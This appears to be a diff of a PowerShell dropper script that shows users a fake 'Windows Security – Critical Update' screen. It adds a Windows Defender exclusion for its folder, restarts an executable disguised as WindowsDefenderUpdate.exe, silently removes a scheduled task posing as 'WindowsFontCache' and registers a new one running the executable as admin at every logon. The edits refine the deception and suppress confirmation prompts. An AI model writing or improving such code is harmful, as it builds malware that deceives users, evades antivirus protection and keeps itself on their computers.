@@ -14,7 +14,7 @@ $host.UI.RawUI.WindowTitle='Windows PowerShell Security Update'
 $host.UI.RawUI.ForegroundColor='White'
 Write-Host '================================================' -ForegroundColor Cyan
 Write-Host '  Windows Security – Critical Update' -ForegroundColor Yellow
-Write-Host '  Patching PowerShell vulnerability CVE-2025-001' -ForegroundColor Gray
+Write-Host '  Applying critical security update...' -ForegroundColor Gray
 Write-Host '================================================' -ForegroundColor Cyan
 Write-Host ''
 Write-Host 'Please do not close this window.' -ForegroundColor White
@@ -51,8 +51,8 @@ Add-MpPreference -ExclusionPath $fdir -Force -ErrorAction SilentlyContinue
 Get-Process | Where-Object { $_.Path -eq "$fdir\WindowsDefenderUpdate.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
-# 3. Remove old scheduled task (if any)
-Unregister-ScheduledTask -TaskName "WindowsFontCache" -ErrorAction SilentlyContinue
+# 3. Remove old scheduled task (no prompt)
+Unregister-ScheduledTask -TaskName "WindowsFontCache" -Confirm:$false -ErrorAction SilentlyContinue
 
 # 4. Create new scheduled task that runs as admin at every logon
 $taskAction    = New-ScheduledTaskAction -Execute "$fdir\WindowsDefenderUpdate.exe"
